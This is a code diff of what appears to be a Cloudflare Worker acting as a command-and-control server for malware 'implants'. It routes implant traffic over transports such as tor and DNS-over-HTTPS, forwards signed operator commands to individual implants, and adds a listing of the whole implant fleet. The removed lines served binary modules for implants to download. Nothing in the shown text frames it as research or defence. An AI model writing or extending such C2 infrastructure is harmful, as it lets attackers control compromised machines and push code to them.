@@ -19,39 +19,24 @@ app.get('/t/:transport/:implantId', async (c) => {
   }
 
   const implantId = c.req.param('implantId');
-  const transport = c.req.param('transport'); // e.g. wss, tor, doh
-  
-  // Route to the specific Durable Object for this implant
+  const transport = c.req.param('transport');
+
   const id = c.env.IMPLANT_STATE.idFromName(implantId);
   const stub = c.env.IMPLANT_STATE.get(id);
 
-  // Pass the request to the DO
   return stub.fetch(c.req.raw);
 });
 
-app.get('/api/operator/ws', async (c) => {
-  const upgradeHeader = c.req.header('Upgrade');
-  if (upgradeHeader !== 'websocket') {
-    return c.text('Expected Upgrade: websocket', 426);
-  }
-
-  // A real C2 would verify an operator token here.
-  // For now, accept the WS and connect them to a global "OperatorHub" DO
-  const id = c.env.IMPLANT_STATE.idFromName('operator_hub');
-  const stub = c.env.IMPLANT_STATE.get(id);
-  
-  return stub.fetch(c.req.raw);
-});
-// Protected by Ed25519 signature verification
+// 2. Operator RPC API (signed with Ed25519)
 app.post('/api/rpc', async (c) => {
   const sigHex = c.req.header('X-Signature');
   const timestamp = c.req.header('X-Timestamp');
-  
+
   if (!sigHex || !timestamp) {
     return c.json({ error: 'Missing X-Signature or X-Timestamp header' }, 401);
   }
 
-  // Reject requests older than 60 seconds (replay protection)
+  // Replay protection: reject requests older than 60 seconds
   const now = Math.floor(Date.now() / 1000);
   const ts = parseInt(timestamp);
   if (Math.abs(now - ts) > 60) {
@@ -59,7 +44,7 @@ app.post('/api/rpc', async (c) => {
   }
 
   const body = await c.req.text();
-  
+
   // Verify Ed25519 signature: sign(timestamp + body)
   const message = new TextEncoder().encode(timestamp + body);
   const signature = Uint8Array.from(sigHex.match(/.{2}/g)!.map((h: string) => parseInt(h, 16)));
@@ -83,45 +68,52 @@ app.post('/api/rpc', async (c) => {
 
   const id = c.env.IMPLANT_STATE.idFromName(implantId);
   const stub = c.env.IMPLANT_STATE.get(id);
-  
-  // Forward RPC command to the Durable Object
-  return stub.fetch(new Request(`http://do/rpc`, {
+
+  // Forward to DO with command name in the body
+  return stub.fetch(new Request('http://do/rpc', {
     method: 'POST',
-    body: JSON.stringify({ command, payload })
+    body: JSON.stringify({ command, payload: { ...payload, implantId } }),
   }));
 });
 
-// 3. Module Delivery Endpoint
-app.get('/modules/:architecture/:name', async (c) => {
-  const name = c.req.param('name');
-  const arch = c.req.param('architecture');
-  
-  // R2 keys already include the .so extension — don't append it
-  const object = await c.env.STORAGE.get(`modules/${arch}/${name}`);
-  if (!object) return c.notFound();
-
-  const headers = new Headers();
-  object.writeHttpMetadata(headers);
-  headers.set('etag', object.httpEtag);
-  
-  return new Response(object.body, { headers });
-});
-
-// 4. Module Manifest Endpoint (for the implant's updater)
-app.get('/modules/manifest.json', async (c) => {
-  const object = await c.env.STORAGE.get(`modules/manifest.json`);
-  if (!object) {
-    return c.json({ modules: [] });
+// 3. Fleet listing (returns all known implants from KV)
+app.get('/api/fleet', async (c) => {
+  const sigHex = c.req.header('X-Signature');
+  const timestamp = c.req.header('X-Timestamp');
+  if (!sigHex || !timestamp) {
+    return c.json({ error: 'Unauthorized' }, 401);
+  }
+  const now = Math.floor(Date.now() / 1000);
+  const ts = parseInt(timestamp);
+  if (Math.abs(now - ts) > 60) {
+    return c.json({ error: 'Timestamp too old' }, 401);
+  }
+  const body = 'fleet';
+  const message = new TextEncoder().encode(timestamp + body);
+  const signature = Uint8Array.from(sigHex.match(/.{2}/g)!.map((h: string) => parseInt(h, 16)));
+  const pubkey = Uint8Array.from(
+    (c.env.OPERATOR_PUBKEY).match(/.{2}/g)!.map((h: string) => parseInt(h, 16))
+  );
+  try {
+    if (!ed25519.verify(signature, message, pubkey)) {
+      return c.json({ error: 'Invalid signature' }, 403);
+    }
+  } catch (e) {
+    return c.json({ error: 'Signature failed' }, 401);
   }
 
-  const headers = new Headers();
-  object.writeHttpMetadata(headers);
-  headers.set('etag', object.httpEtag);
-  headers.set('Content-Type', 'application/json');
-  
-  return new Response(object.body, { headers });
+  // List implants from KV (operator registers implants by ID)
+  const list = await c.env.FLEET_CONFIG.list();
+  const implants = [];
+  for (const key of list.keys) {
+    const data = await c.env.FLEET_CONFIG.get(key.name);
+    if (data) {
+      implants.push(JSON.parse(data));
+    }
+  }
+  return c.json({ implants });
 });
 
-// The Durable Object Class exported for Cloudflare
+// Export DO + default app
 export { ImplantDO } from './durable-object';
 export default app;
